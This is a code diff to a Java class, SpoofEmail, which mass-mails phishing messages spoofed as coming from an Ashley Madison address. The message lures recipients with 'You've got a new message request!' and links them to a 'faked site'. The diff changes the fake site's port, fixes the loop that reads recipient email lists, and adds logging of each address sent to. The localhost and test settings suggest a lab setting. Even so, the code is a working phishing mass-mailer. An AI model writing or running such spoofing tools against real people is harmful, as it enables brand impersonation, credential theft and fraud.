@@ -22,7 +22,10 @@ public class SpoofEmail {
 	static final String from      = "no-reply@ashleymadisonlife.com";
 	static final String subject   = "You've got a new message request!";
 	static final String siteip    = "localhost";
-	static final String siteport  = "8080";
+
+	/* HTTP port that faked site is running on */
+	static final String siteport  = "5000";
+
 	static final String body      = "Click <a href='http://" + siteip + ":" + siteport + "'>here</a> to resolve all pending invitations.";
 	static final String smtp_host = "localhost";
 	static final String smtp_port = "25";
@@ -30,7 +33,9 @@ public class SpoofEmail {
 	static final String smtp_pass = "test";
 
 	public static void main(String [] args) throws IOException {
-		for (int i=1; i<args.length; i++){
+		System.out.println("Running email spoofer with " + (args.length) + " emails...");
+		for (int i=0; i<args.length; i++){
+			System.out.println("Reading email list " + args[i]);
 			parseList(args[i]);
 		}
 	}
@@ -53,7 +58,9 @@ public class SpoofEmail {
 
 		try (Scanner emails = new Scanner(new File(filename))) {
 			while (emails.hasNextLine()) {
+
 				String email = emails.nextLine();
+				System.out.println("Sending email to: " + email);
 
 				try {
 					MimeMessage msgobj = new MimeMessage(session);
